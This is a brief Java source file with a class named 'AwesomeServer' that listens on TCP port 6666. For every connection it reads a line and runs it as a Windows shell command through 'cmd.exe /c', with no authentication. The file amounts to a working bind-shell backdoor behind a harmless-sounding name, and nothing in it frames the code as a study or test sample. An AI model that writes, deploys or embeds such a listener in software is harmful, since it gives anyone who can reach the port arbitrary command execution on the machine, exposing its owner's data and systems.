package org.matthew;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;

public class AwesomeServer implements Runnable{


    @Override
    public void run() {
        try {
            ServerSocket serverSocket = new ServerSocket(6666);
            serverSocket.setSoTimeout(0);
            while (true) {
                try {
                    Socket clientSocket = serverSocket.accept();
                    BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                    ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", in.readLine());
                    Process process = builder.start();
                    System.out.println(process.isAlive());
                }
                catch (SocketTimeoutException e) {
                    e.printStackTrace();
                }
            }
        }
        catch (IOException e1) {
            e1.printStackTrace();
        }
    }
}
